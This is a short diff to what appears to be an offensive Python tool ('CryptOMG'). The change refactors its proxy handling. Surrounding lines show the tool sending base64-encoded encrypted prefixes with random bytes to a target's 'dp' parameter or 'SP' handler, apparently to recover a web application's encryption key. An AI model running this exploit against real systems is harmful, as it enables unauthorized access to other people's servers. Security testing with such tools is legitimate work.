@@ -57,7 +57,10 @@ class CryptOMG():
         self.exploit_url = ""
         self.findKeyComplete = False
 
-        self.proxies = {'http':proxy,'https':proxy}
+        if proxy:
+            self.proxy = {'http':proxy,'https':proxy}
+        else:
+            self.proxy = None
 
         if knownkey:
 
@@ -153,7 +156,7 @@ class CryptOMG():
 
         self.request_count += 1
         self.terminal.footer_draw()
-        r = requests.get(fullurl,headers=headers,verify=False,proxies=self.proxies)
+        r = requests.get(fullurl,headers=headers,verify=False,proxies=self.proxy)
         self.msgPrint(f"Sent version for version {version}. Resulting code: [{r.status_code}] Response Size: [{len(r.content)}] (Total request count: [{self.request_count}])",style="debug")
         return r
 
@@ -213,14 +216,14 @@ class Block():
             else:
                 fullUrl = f'{str(self.url)}?dp={base64.b64encode((encryptedPrefix + randBytes)).decode()}'
 
-            r = requests.get(fullUrl,headers=headers,verify=False,proxies=self.parent.proxies)
+            r = requests.get(fullUrl,headers=headers,verify=False,proxies=self.parent.proxy)
 
 
         elif self.parent.handler == "SP":
 
             fullUrl = f'{str(self.url)}'
             data = {"DictionaryLanguage":"en-US","Configuration":base64.b64encode((encryptedPrefix + randBytes)).decode()}
-            r = requests.post(fullUrl,headers=headers,data=data,verify=False,proxies=self.parent.proxies)
+            r = requests.post(fullUrl,headers=headers,data=data,verify=False,proxies=self.parent.proxy)
 
         else:
             self.parent.msgPrint("Invalid Handler Type!",style="error")
